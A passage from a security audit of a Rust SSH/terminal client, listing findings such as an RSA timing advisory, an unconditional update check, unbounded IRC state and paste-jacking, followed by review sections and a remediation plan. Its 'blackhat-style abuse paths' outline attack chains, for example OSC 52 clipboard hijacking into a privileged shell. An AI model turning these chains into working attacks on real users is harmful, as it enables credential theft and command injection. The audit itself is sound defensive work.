RUSTSEC-2023-0071: `rsa` Marvin timing side channel (via russh)

#### Severity
Low

#### Confidence
High

#### Affected Files / Components
`rust/Cargo.lock` — `rsa 0.10.0-rc.18` ← `russh` (feature `rsa`) ← `nexus-core`.

#### Description
`cargo audit` reports the Marvin attack (CVSS 5.9): RSA private-key operations in the `rsa` crate are not constant-time. In this app the private-key operation is client authentication with an RSA user key (`authenticate_publickey`), and RSA key generation. No fixed release exists.

#### Evidence
```
Crate: rsa  Version: 0.10.0-rc.18  ID: RUSTSEC-2023-0071  Solution: No fixed upgrade is available!
```

#### Attack Scenario
Position B/C: an attacker who can time many signature operations on the client (thousands of authentications) could in theory recover an RSA user key. The client signs once per connection with a user-triggered action, so sample collection is impractical.

#### Impact
Theoretical RSA user-key recovery.

#### Recommendation
Prefer Ed25519 keys (the key manager already defaults to it); keep the `rsa` feature for compatibility; track the advisory and upgrade when a fix ships; add `cargo audit` to CI with this advisory explicitly ignored and reviewed.

#### References
RUSTSEC-2023-0071, CWE-208, CWE-385.

---

### Finding ID: SEC-20261012-013

#### Title
Update check runs on every launch although documented as opt-in

#### Severity
Low

#### Confidence
High

#### Affected Files / Components
`rust/app/src/app.rs` `App::new` (lines 190-200), `rust/core/src/updater.rs` (module doc: “Opt-in and check-only”), `rust/core/src/service.rs` `check_for_updates`.

#### Description
Every non-screenshot launch spawns a thread that fetches `https://dixon.cx/downloads/nexus/manifest-<os>-<arch>.json` with a fixed User-Agent. There is no preference to disable it and no notice. The request leaks OS/arch, IP and launch frequency to the update host; the response controls a banner and (now http(s)-only) link. The code comment in `updater.rs` says opt-in, the behaviour is unconditional.

#### Evidence
```rust
if app.screenshot.is_none() { std::thread::spawn(move || { if let Ok(info) = svc2.check_for_updates() { ... } }); }
```

#### Attack Scenario
Position B: on a hostile network the TLS connection reveals that Nexus Terminal is in use (SNI); a compromised update host can push “update available” banners pointing at a phishing page.

#### Impact
Privacy (phone-home), low-grade social engineering.

#### Recommendation
Add `checkForUpdates: bool` to `AppPreferences` (default on with a first-run notice, or off), honour it in `App::new`, and align the module docs. Sign the manifest (e.g. minisign/ed25519 with an embedded public key) and verify before showing anything.

#### References
CWE-359, OWASP ASVS 14.2 (update integrity).

---

### Finding ID: SEC-20261012-014

#### Title
Hostile IRC server can grow channel/user/target state without bound

#### Severity
Low

#### Confidence
Medium

#### Affected Files / Components
`rust/core/src/clients/irc.rs` `handle_join` (inserts a `Channel` for any JOIN seen), `handle_names`; `rust/app/src/irc_view.rs` `target()` (new `Target` per unseen PRIVMSG/NOTICE source; `MAX_LINES` applies per target only).

#### Description
Line length (1 MiB) and LIST entries (2000) are capped, but the number of channels, users per channel and UI targets is driven entirely by server messages. A server can emit millions of `:x!u@h JOIN #random-<n>` or PRIVMSGs from unique nicks.

#### Evidence
```rust
let ch = st.channels.entry(fold(&room)).or_insert_with(|| Channel { ... });   // any JOIN
```

#### Attack Scenario
Position A: a malicious IRC network grows the client to gigabytes over hours.

#### Impact
Memory exhaustion of the client.

#### Recommendation
Only track channels the client itself joined (`is_me(from)`), cap users per channel (e.g. 10 000) and UI targets (e.g. 200 with LRU eviction).

#### Suggested Tests
Feed 100 000 JOINs for distinct rooms from other nicks; assert `channels.len()` stays 0.

#### References
CWE-770.

---

### Finding ID: SEC-20261012-015

#### Title
Saved credentials written before authentication succeeds; store failure silent

#### Severity
Low

#### Confidence
Medium

#### Affected Files / Components
`rust/core/src/sessions.rs` `Manager::secret_fn` (lines 409-434), `Secrets::set` (`let _ = self.set_checked(..)`).

#### Description
In `SecretMode::Saved`, the value typed at the prompt is stored immediately (`secrets.set`) before the server accepts it, so a mistyped password is persisted and every later connection silently retries the wrong value with no re-prompt path (the saved value short-circuits the prompt). `Secrets::set` discards the error, so when the keychain refuses and the vault is locked the user is never told the credential was not saved.

#### Evidence
```rust
let v = prompt(&format!("Enter {kind}:"))?;
match mode { SecretMode::Saved => secrets.set(&key, &v), ... }
```

#### Impact
Lock-out loop until the user edits the profile; silent non-persistence.

#### Recommendation
Store after `authenticate` returns success (pass a `confirm: FnOnce()` back from the auth path), and on auth failure with a saved credential offer “Re-enter and replace”. Surface `set_checked` errors as a toast.

#### References
CWE-287 (design), CWE-390 (Detection of Error Condition Without Action).

---

### Finding ID: SEC-20261012-016

#### Title
Empty vault accepts any master password

#### Severity
Low

#### Confidence
Medium

#### Affected Files / Components
`rust/core/src/secrets.rs` `Vault::unlock` (“An empty vault accepts any password, as in Go”).

#### Description
With no entries there is nothing to verify, so any password “unlocks” the vault; the first `set` then encrypts under a key derived from that (possibly mistyped) password. The next unlock with the intended password fails and the stored secret is unrecoverable, or worse, a second mistyped unlock leads to entries encrypted under different keys in one file.

#### Recommendation
Store a verifier at initialisation (e.g. an AES-GCM-sealed constant under a fixed key id such as `__verifier__`), check it on unlock. Backward compatible: vaults without it keep today's behaviour until re-initialised.

#### References
CWE-287, CWE-754.

---

### Finding ID: SEC-20261012-017

#### Title
Multi-line paste sent without confirmation (paste-jacking)

#### Severity
Low

#### Confidence
High

#### Affected Files / Components
`rust/app/src/terminal.rs` `TermView::paste`, `rust/app/src/sftp.rs` `paste_files`.

#### Description
Pasted text (clipboard or dropped files) goes to the PTY unchanged except for CRLF→CR; in non-bracketed mode a `\r` executes each line immediately. Bracketed paste correctly strips `ESC` so the end marker cannot be forged. Browsers and web pages can place invisible text on the clipboard.

#### Recommendation
When the paste contains a newline and the terminal is not in bracketed-paste mode, show a confirmation preview (as Windows Terminal/iTerm2 do); make it a preference.

#### References
CWE-451.

---

### Finding ID: SEC-20261012-018

#### Title
`--answer` passes secrets as process arguments

#### Severity
Low

#### Confidence
High

#### Affected Files / Components
`rust/app/src/main.rs` (`--answer SECRET`, `--run-local CMD`), `rust/app/src/app.rs` (`Event::SecretPrompt` auto-reply).

#### Description
The screenshot/test automation flags accept credentials on the command line, exposing them in the process list and shell history. The code and docs present them as a test aid.

#### Recommendation
Read answers from an environment variable or a file descriptor (`--answer-file`) and document that the flags are for automation only; print a warning when used outside `--screenshot`.

#### References
CWE-214.

---

### Finding ID: SEC-20261012-019

#### Title
Supply chain: tag-pinned actions, no explicit CI token permissions, unsigned releases

#### Severity
Low

#### Confidence
Medium

#### Affected Files / Components
`.github/workflows/ci.yml`, `.github/workflows/release-builds.yml` (`actions/checkout@v4`, `actions/upload-artifact@v4`, `softprops/action-gh-release@v2`, `permissions: contents: write`), `rust/packaging/macos/build-app.sh` (ad-hoc `codesign --sign -`), `rust/release.sh` (manifest with sha256 but no signature). Not modified (outside `rust/`, except the packaging script which is correct as a dev convenience).

#### Description
Actions are pinned by mutable tag rather than commit SHA; `ci.yml` sets no `permissions:` block so the default token scope applies; release zips are not signed and macOS bundles are only ad-hoc signed; the updater cannot verify what it points users at. Positives: `rust-toolchain.toml` pins 1.99.0, builds use `--locked`, `cargo audit` is now known clean except SEC-012.

#### Recommendation
Pin actions to SHAs, add `permissions: contents: read` to `ci.yml`, add a `cargo audit`/`cargo deny` job, sign release artefacts (Sigstore/minisign) and publish the public key; Developer ID + notarisation for macOS.

#### References
CWE-494, CWE-829; SLSA Build L2/L3.

---

### Finding ID: SEC-20261012-020

#### Title
Recording listing reads every `.cast` file fully

#### Severity
Low

#### Confidence
Medium

#### Affected Files / Components
`rust/core/src/recording.rs` `Store::read_meta` (reads the whole file and streams every JSON value to find the last timestamp).

#### Description
Opening the Recordings window reads all recordings (each up to 250 MiB) into memory to compute duration. With a few large recordings this is seconds of I/O and hundreds of MiB transiently. Local-only.

#### Recommendation
Parse the header from the first line, then seek to the tail (last 64 KiB) for the last event's timestamp; or cache metadata in SQLite when recording stops.

#### References
CWE-400.

---

### Finding ID: SEC-20261012-021

#### Title
Insecure-by-choice modes

#### Severity
Informational

#### Confidence
High

#### Affected Files / Components
`HostKeyPolicy::Insecure` (`sessions.rs` `host_key_check`), direct VNC (`chrome.rs` `Dialog::DirectVnc`), Telnet/RAW.

#### Description
`insecure` accepts any host key (fingerprint changes are not even compared); direct VNC sends keystrokes and screen contents in clear (DES challenge-response only protects the password); Telnet/RAW are clear text. All are explicit user choices with warnings (VNC) or labelled options (SSH). TOTP uses HMAC-SHA-1 as RFC 6238 requires; VNC auth uses DES as RFB requires — both are protocol-mandated, not design errors.

#### Recommendation
Keep; consider a visible "insecure" badge on tabs using these modes and an audit-log entry when `insecure` host-key policy is used (an entry exists for `connect`, not for the policy).

---

### Finding ID: SEC-20261012-022

#### Title
Verified-absent issue classes

#### Severity
Informational

#### Confidence
High

#### Description
Checked and not found:

- **SQL injection** — all queries use `?` parameters (`storage.rs`); column lists are compile-time constants.
- **Path traversal** — SFTP multi-download uses `safe_sftp_upload_name` (base name, rejects `.`/`..`/NUL); recording IDs reject separators; SSH key names are `[A-Za-z0-9_-]`; imports use OS file dialogs.
- **TLS verification bypass** — none; rustls with webpki roots (IRC) and ureq defaults (HTTP); `ServerName` from the configured host.
- **Authorization header leakage on redirect** — ureq 3.4.2 defaults to `RedirectAuthHeaders::Never` (verified in source).
- **Weak SSH algorithms** — russh DEFAULT excludes SHA-1 kex/MAC and CBC; only `ssh-rsa` (SHA-1 signature) remains as the last-resort host-key algorithm after rsa-sha2-512/256.
- **Hardcoded secrets** — none; test fixtures (`vault.json` with a documented password, `profiles.link`) are deliberate compatibility data and contain no real credentials; git history (`-S "PRIVATE KEY"`) shows only test strings.
- **`unsafe`** — only in test code (`libc::openpty`, `set_var` in the agent test) with safety comments.
- **ReDoS** — user regexes go through the `regex` crate (linear time, 10 MiB compile limit).
- **Deserialisation bombs** — serde_json default recursion limit (128); all inputs size-capped.
- **GitHub base URL** — HTTPS enforced except loopback; userinfo rejected (`validate_github_config`).
- **Host-key verification coverage** — every hop: target, each jump host, VNC/IRC tunnels (`tunnel()` uses `HostKeyPolicy::Ask`).
- **Remote-forward channel policy** — only `(bind, port)` pairs the client registered are accepted; agent channels only when forwarding was requested.

## 8. Blackhat-Style Abuse Paths

1. **Hostile SSH host → clipboard → victim's other shell** (open: SEC-010). Prerequisite: victim connects to attacker's host or a compromised one. Chain: server emits OSC 52 when it sees the victim select text (xterm mouse reporting tells it) → clipboard replaced → victim pastes into a privileged local shell. Breakpoints: preference/toast for remote clipboard writes; bracketed paste on the destination; paste confirmation (SEC-017).
2. **Stolen laptop/backup → credentials** (largely closed). `nexus.db` gives hosts, users, proxy passwords and scripted passwords in clear (SEC-011); `vault.json` needs the master password (Argon2id 128 MiB makes offline guessing ≈ 0.3 s per guess per core); keychain items need the OS session. Orphaned keychain entries from deleted profiles are no longer left behind (SEC-001). Breakpoints: full-disk encryption, moving proxy/login-script secrets to the store.
3. **Local low-privilege malware** (closed). Previously: harvest ssh-keygen passphrases from `ps` (SEC-002), hijack the IRC/VNC loopback bridge (SEC-003), read 0644 recordings containing typed passwords (SEC-008). Remaining: read 0600 files as the same user (inherent), `--answer` argv (SEC-018).
4. **Malicious VNC/IRC server → client crash** (VNC closed, IRC open). VNC size/length bombs fixed (SEC-004); IRC state growth remains (SEC-014). A crash drops every open session, including recordings mid-write (the recorder `sync_all`s per event, so data up to the crash survives).
5. **Compromised update host** (reduced). Could push a banner and link; link is now http(s)-only (SEC-005). Still unsigned (SEC-013/019). Breakpoint: manifest signature.
6. **MITM on first connection (TOFU)** (accepted). `Ask` shows key type + SHA-256 fingerprint; `accept-new` auto-trusts. Breakpoints: SSHFP/known_hosts import, certificate CA trust (not supported; certificates are reduced to their public key).

## 9. Denial-of-Service and Resource Exhaustion Review

| Vector | Control | Status |
|---|---|---|
| VNC desktop size / ZRLE length | 64 Mpx / 64 MiB caps | Fixed (SEC-004) |
| VNC server strings / clipboard | 1 MiB / 16 MiB caps | OK |
| Telnet unterminated IAC | 8 KiB pending cap | OK |
| RAW history | 10 000 entries / 10 MiB | OK |
| IRC line / LIST | 1 MiB / 2000 | OK; channel/user/target maps unbounded (SEC-014) |
| SSH `run_command` | 1 MiB cap | Fixed (SEC-009) |
| SSH forward connections | handles pruned; no connection-rate limit on bind address (defaults to loopback) | Fixed/partial |
| Login-script buffer | 16 KiB tail | OK |
| Terminal scrollback | ≤100 000 lines per view | OK |
| Trigger line buffer | 64 KiB without newline | OK |
| GitHub JSON / archive | 4 MiB / 2 GiB; 5000 repos; 5 commit-lookup workers; refresh ≥60 s | OK (rate-limit burn is a product concern) |
| Update manifest | 1 MiB, 10 s timeout | OK |
| Imports / key files / ssh config | 5–10 MiB caps; 5000 Host blocks | OK |
| Recording write / playback | 250 MiB / 100 MiB; listing reads whole files | Open (SEC-020) |
| Prompt timeouts | 300 s credential, 60 s host key | OK |
| Reconnect storms | exponential backoff 1–30 s, max tries (default 5) | OK |
| Threads | one per connect/close event/upload; unbounded only by user actions | Acceptable |
| Keychain probe | one write+delete per launch | Acceptable |

## 10. Cryptography and Key Management Review

- **Vault / export**: Argon2id (m=128 MiB, t=3, p=4, 32-byte key, 32-byte CSPRNG salt) → AES-256-GCM with a fresh 96-bit CSPRNG nonce per seal; each secret individually sealed. Random nonces are safe here because the message count per key is tiny (≪2^32). Decryption failure is treated as “wrong password or corrupt” with no oracle beyond that. Keys now zeroized. Clean.
- **Randomness**: `rand::thread_rng()`/`OsRng` (ChaCha-based CSPRNG seeded from the OS) for salts/nonces/UUIDs; `OsRng` for key generation. No `Math.random`-class sources. Clean.
- **SSH**: russh 0.64.1 defaults — kex `mlkem768x25519-sha256` (hybrid post-quantum, FIPS 203 ML-KEM + X25519) first, then curve25519, DH-GEX-SHA256, DH group 14–18; ciphers chacha20-poly1305, aes256-gcm, aes*-ctr; MACs SHA-2 ETM/plain only; host keys ed25519, ecdsa, rsa-sha2-512/256, `ssh-rsa` last. Strict-kex extension advertised. Host-key verification per hop with SHA-256 fingerprints; `Insecure` policy is opt-in. Harvest-now-decrypt-later exposure for SSH is therefore already mitigated when the server supports the hybrid kex (OpenSSH ≥ 9.9); against older servers it falls back classically — unavoidable interop, accepted residual.
- **TLS**: IRC via rustls 0.23 (`with_safe_default_protocol_versions` = TLS 1.2/1.3, webpki roots, hostname verification); HTTP via ureq 3 + rustls. No `danger`/insecure verifiers anywhere. Hybrid PQ TLS (X25519MLKEM768) is available in rustls when the `aws-lc-rs` provider is used; the `ring` provider in use does not negotiate it — optional improvement for the IRC/HTTPS paths, interop-safe because it is negotiated.
- **TOTP**: RFC 6238 HMAC-SHA1, 6 digits, 30 s — protocol-mandated; verified against RFC vectors in tests. Secrets stored in keychain/vault, not the DB (unless imported inline).
- **VNC auth**: DES challenge-response — protocol-mandated; app warns about direct VNC.
- **Password strength meter**: heuristic UI only; the vault's security rests on Argon2id cost.
- **Key management**: no hardcoded keys; vault key lives only while unlocked; export salt/nonce per file; SSH keys written 0600 in-process. No rotation story for the vault master password (no re-encrypt flow) — functionality note.
- **Comparisons**: AES-GCM tag verification is constant-time in `aes-gcm`; VNC/TOTP do not compare secrets locally; known-host fingerprints are compared with `!=` on public data (fine).
- **Post-quantum readiness**: SSH hybrid kex present; vault/export are symmetric (AES-256, quantum-safe at 128-bit Grover margin); no long-lived signatures are produced by the app. Recommendation: enable aws-lc-rs for TLS hybrid kex when convenient; sign releases with Ed25519 now and plan ML-DSA when tooling matures.

## 11. Secrets Lifecycle and In-Memory Credential Review

| Stage | Observed | Assessment |
|---|---|---|
| Entry | egui password fields; `--answer` argv (SEC-018) | UI buffers not wiped (SEC-007) |
| Storage | Keychain first (`keyring` 3.6, D-Bus/Keychain/CredMan), vault fallback (AES-GCM blobs 0600, atomic now), legacy `AlchementaryLink` read-through copied forward | Good; keychain items keyed by profile id |
| In profiles/DB | `proxyPassword`, inline `totpSecret`, login-script sends in clear in `nexus.db` (SEC-011) | Open |
| Exports | `.nexus` AES-GCM; JSON export redacts proxy/TOTP only, now 0600 | Gap for login scripts |
| Recordings | typed input captured in clear, now 0600 inside 0700 dir | Document to users |
| Process boundaries | `ssh-keygen` argv removed (SEC-002); child shell inherits full environment (expected for a terminal); keychain via D-Bus (Secret Service encrypts in transit) | OK |
| In memory | Argon2 keys `Zeroizing`; secret `String`s unwiped; `SessionOnly` cache holds plaintext for the session; no `mlock`/`DONTDUMP`; core dumps follow system defaults | Low, open |
| Logs | `eprintln!` only for CLI misuse and non-web URL refusal (URL text could include a token if a server embeds one — acceptable, local stderr); audit log stores actions and names, never values | OK |
| Deletion | profile delete now purges keychain + vault; TOTP delete removes both | Fixed |
| Debug endpoints | none (no HTTP server, no pprof) | Clean |

## 12. Memory and Resource Safety Review

- `unsafe`: two occurrences, both in `#[cfg(test)]` code (`libc::openpty`/`from_raw_fd` for the serial PTY harness; `std::env::set_var` in the agent test) with SAFETY notes. No FFI in production code beyond vetted crates (`serialport`, `portable-pty`, `rusqlite` bundled SQLite, `ring`).
- Parsers: Telnet (`handle_iac` bounds-checks every index), VNC (`fb.check` before every `put`/`fill`; hextile sub-rects validated; ZRLE palette indices checked; Tight palette/size validated; sizes now bounded), IRC (`find`-derived byte offsets, char-safe), asciicast (line caps), SOCKS5/HTTP CONNECT replies (fixed-size reads; 16 KiB head cap), SSH config (line and block caps). Integer arithmetic on `u16` dims is widened to `usize` before multiplication; the `x + w` additions in hextile/ZRLE loops operate on `u16` after `fb.check` guarantees `x+w ≤ width ≤ 65535`, so no overflow.
- Panics reachable from remote data: none found; `unwrap()` on mutexes would only panic after a prior panic (poisoning) — see functionality report.
- Resource growth: see §9; IRC maps remain the one unbounded structure.

## 13. Dependency and Supply-Chain Review

- `cargo audit` 0.22.2 (RustSec DB 1296 advisories, 598 crates): **1 advisory** — RUSTSEC-2023-0071 (`rsa`, via russh, no fix) — SEC-012. No yanked crates reported.
- Security-relevant crates and versions: russh 0.64.1, russh-sftp 3.0.1, ssh-key 0.7.0-rc.11 (release candidate — pinned exactly by russh; watch for the stable release), rustls 0.23.45, ring 0.17.14, webpki-roots 1, ureq 3.4.2, aes-gcm 0.10.3 (0.11 also present transitively), argon2 0.5.3, keyring 3.6.3, rusqlite 0.37 (bundled SQLite), tokio 1.53.2, serialport 4.10.1, portable-pty 0.9, image 0.25.10 (JPEG decoding of VNC Tight data — a decoder bug would be remotely reachable; keep current), flate2 1.1.10, des 0.9 (VNC auth only), zeroize 1.9.1 (now direct).
- Pinning: `rust-toolchain.toml` = 1.99.0; CI and release use `--locked`; `Cargo.lock` committed. Good.
- Build scripts: `app/build.rs` only embeds the Windows icon (no network, no codegen).
- CI (outside `rust/`): actions pinned by tag; `ci.yml` lacks `permissions:`; release workflow has `contents: write` (needed). No secrets referenced beyond `GITHUB_TOKEN`.
- Releases: zips + sha256 in manifest; unsigned; macOS ad-hoc signature; Windows unsigned. The app never downloads updates, which limits the blast radius of a compromised host to UI text and a link.
- Recommendation: add `cargo audit`/`cargo deny` to CI (ignore list with justification), SHA-pin actions, sign artefacts, consider `cargo vet` for the crypto/SSH crates.

## 14. Authentication and Authorisation Review

Single-user desktop app; no server-side authz. Reviewed instead:

- **SSH auth chain**: agent identities (RSA hash negotiated via `best_supported_rsa_hash`), configured key (passphrase prompted only if encrypted), password, keyboard-interactive with TOTP auto-answer on prompts matching 2FA keywords; non-TOTP prompts get the password callback (consistent with password auth; no extra exposure). Jump hosts: public key/agent only. Tunnels: method per profile.
- **Host keys**: policies `strict/ask/accept-new/insecure`; changed keys rejected with the stored vs received fingerprints in the error for all but `insecure`; certificates are treated as plain keys (no CA trust — note for §6 of the functionality report).
- **VNC**: None or VNC-auth; Apple ARD unsupported with a clear message; password asked only when the server requires it.
- **IRC**: PASS and NickServ IDENTIFY (plaintext over the connection unless TLS/SSH tunnel); SASL not implemented.
- **GitHub**: Bearer token; validated with `/user` before use; re-prompt on 401/403; token never logged.
- **Vault**: master password → Argon2id; lock/unlock UI; app `lock()`s on exit.
- **Local**: known-hosts and profiles are per-user files; no privilege separation needed.

## 15. Input Validation and Output Encoding Review

- Profiles: `validation.rs` covers hosts (no whitespace/scheme/leading `-`), ports, usernames (no control chars), per-protocol configs, IRC nick/channel grammar, GitHub URL scheme/userinfo, serial line settings. Applied on create/update/import; **not** on Quick Connect (`connect_quick`) or `import_ssh_config` (profiles stored unvalidated — low risk, SSH only).
- Hostnames flow to `ToSocketAddrs`, SOCKS5 (now ≤255 bytes), HTTP CONNECT (`Host:` header built from a validated host; CRLF impossible after whitespace rejection), SSH `direct-tcpip` requests.
- Terminal output: `alacritty_terminal` handles escape sequences; OSC 52 write is the only sink that acts outside the grid (SEC-010); title changes only update the tab name.
- IRC text: `strip_terminal_escapes` removes OSC/CSI/C1 before mIRC parsing; rendered via egui text (no markup injection possible).
- RAW view: non-printables rendered as `·`; hex dump pure ASCII.
- File names from SFTP listings: used for remote ops verbatim (correct), sanitised for local writes.
- JSON: unknown fields ignored by serde; enums reject unknown values except `SecretMode` which maps to ask-every-time (safe default). Note: an unknown `hostKeyPolicy` string makes the whole `ssh_config` column parse to `None` and the profile silently falls back to defaults (`ask`) — safe direction, but surprising.

## 16. Frontend HTML/JavaScript Robustness Review

Not applicable: the UI is native egui/eframe (no HTML, JavaScript, WebView or localStorage). Equivalent checks performed: every worker thread reports errors through `post_error`/`Job`/inbox queues drained on the UI thread (no silent async failures found); modals consume keyboard shortcuts while open; `open_url` is the only browser interaction and is now scheme-restricted; the clipboard is written by user actions, OSC 52 and VNC (SEC-010). Console diagnostics are `eprintln!` for CLI misuse and refused URLs only; no secrets are printed.

## 17. Infrastructure and Deployment Review

- No containers, servers or IaC. Data directory `~/.config/NexusTerminal` (0700) / `%APPDATA%` / `~/Library/Application Support`; legacy data copied (never moved) from `AlchementaryLink` with a marker file.
- Linux install script installs to `~/.local/bin` (user scope, 0755 binary). macOS bundle ad-hoc signed; `Info.plist` templated. Windows: icon/version resource only.
- Release script builds with `--locked`, strips Linux binaries, writes per-platform manifests with sha256 and size; URLs default to `https://dixon.cx/downloads/nexus`.
- The update host is a single static origin without signing (SEC-013/019).

## 18. Logging, Monitoring, and Error Handling Review

- Audit log (SQLite): profile create/update/delete, connect/disconnect, secret access (kind only), import/export — no values. Good for forensics; no size cap or rotation (grows unbounded over years; low concern).
- Errors: `Box<dyn Error>` strings surfaced as toasts; SSH failures classified for guided dialogs; host-key mismatch message includes both fingerprints (useful, not sensitive).
- No crash reporter/telemetry; panics print to stderr and abort the process (no panic hook) — a panic in any worker thread while holding a `Mutex` poisons it and `lock().unwrap()` then panics the UI thread. See functionality report.
- stderr: `--connect`/`--open`/`--do` misuse, screenshot errors, refused URLs. No secrets.

## 19. Test Coverage and Security Regression Gaps

Present (142 tests after this run): vault/export compatibility fixtures, Argon2/AES round trips, atomic private writes, profile-delete purge, validation matrix, SSH config parsing caps, Telnet negotiation over a real socket, RAW history caps, serial PTY harness, IRC fake server (registration, tracking, close semantics), VNC fake server (auth, decoders, bounds), GitHub fake API (pagination, auth errors, archive cap), updater local HTTP (oversize cap), session manager (local shell, reconnect backoff, error state), OpenSSH integration (shell, exec, forwards, SFTP, jump chain, agent forwarding, host-key rejection), key generation, loopback pair, SOCKS5 encoding, URL scheme guard, terminal key encoding/find/mouse reports, triggers, raw/IRC views.

Gaps:

- No fuzzing of `vnc::read_update`, `telnet::process`, `irc::parse_line`/`ircformat`, `recording::get` — recommend `cargo-fuzz` targets.
- No test that OSC 52 / VNC clipboard behaviour is gated (SEC-010, once implemented).
- No test that JSON export without secrets omits login-script passwords (SEC-011).
- No test for the IRC state caps (SEC-014) or the saved-credential-after-auth ordering (SEC-015).
- Keychain-backed paths (`Keychain::get/set/delete`, legacy copy-forward) untested in CI (needs a Secret Service/Keychain).
- `cargo audit` not in CI.

## 20. Prioritised Remediation Plan

**Immediate (done in this run)**: SEC-001, 002, 003, 004, 005, 006, 008, 009 and the key-zeroization half of SEC-007 — commits `9cf2217`, `0a18f7e`, `aac986d`.

**Short term (next release)**
- SEC-010: preference + toast for remote clipboard writes (terminal and VNC).
- SEC-013: update-check preference; align docs; sign the manifest.
- SEC-015: persist saved credentials only after successful auth; surface store errors.
- SEC-014: track only joined channels; cap users/targets.
- SEC-019: SHA-pin actions, `permissions: contents: read` in `ci.yml`, `cargo audit` job (outside `rust/`).

**Medium term**
- SEC-011: move `proxyPassword` to the secret store; redact login-script sends in exports; warn in the editor.
- SEC-007: `Zeroizing<String>`/`SecretString` for in-flight secrets; wipe prompt buffers; `PR_SET_DUMPABLE`.
- SEC-016: vault verifier entry.
- SEC-017: multi-line paste confirmation.
- SEC-020: tail-based recording metadata.
- Fuzz targets for the four remote parsers.

**Long term**
- Signed, verified updates (and optionally in-app download with sha256 + signature check).
- SSH certificate/CA trust and `~/.ssh/known_hosts` import.
- aws-lc-rs provider for hybrid PQ TLS; `cargo vet` for crypto/SSH crates.

## 21. False Positives / Needs Manual Verification

- **Stale build cache**: the initial `cargo test` showed 4 fixture-test failures caused by a `target/` directory compiled when the checkout lived at `~/src/link` (the `env!("CARGO_MANIFEST_DIR")` path was baked in). `cargo clean -p nexus-core` resolved it; not a code defect. Owners moving the checkout should run `cargo clean`.
- **Keychain purge (SEC-001)**: the vault half is covered by a test; the keychain half was verified by reading `Keychain::delete` but not executed against a live Secret Service in this environment — verify once per OS.
- **SEC-003 race**: the hijack window is tiny; the fix is defence-in-depth. The accepting test exercises the peer check, not a real race.
- **SEC-012**: exploitability of Marvin against an interactive SSH client is theoretical; no action beyond tracking.
- **IRC/VNC clipboard (SEC-010)** is a judgement call versus compatibility; rated Medium because of the paste-into-shell consequence, Low if the owner considers terminal-standard behaviour acceptable.
- **egui `persistence`** stores window layout only (`persist_egui_memory`), verified not to include text-edit contents.

## 22. Final Notes

The Rust port carries over the Go app's data formats faithfully and improves on several of its controls (per-hop host-key checks, bounded parsers, keychain-first storage). After this run the remaining risk is concentrated in (1) user-facing conveniences that mirror terminal-industry defaults (remote clipboard writes, unconfirmed paste), (2) plaintext fields the profile model inherited for compatibility, (3) an unsigned update channel, and (4) one upstream advisory without a fix. None of the open items allows remote compromise without a hostile server plus user interaction or a local foothold.

Limitations: no live testing against production servers; keychain code paths exercised by reading only; UI behaviour verified by code review and the existing screenshot automation rather than a scripted UI run; files outside `rust/` reviewed but intentionally not modified per the owner's instruction.

Commits created: `9cf2217`, `0a18f7e`, `aac986d` (all on `rust-port`, each after `cargo test --workspace`, `cargo fmt --check` and `cargo clippy --all-targets -D warnings` passed).
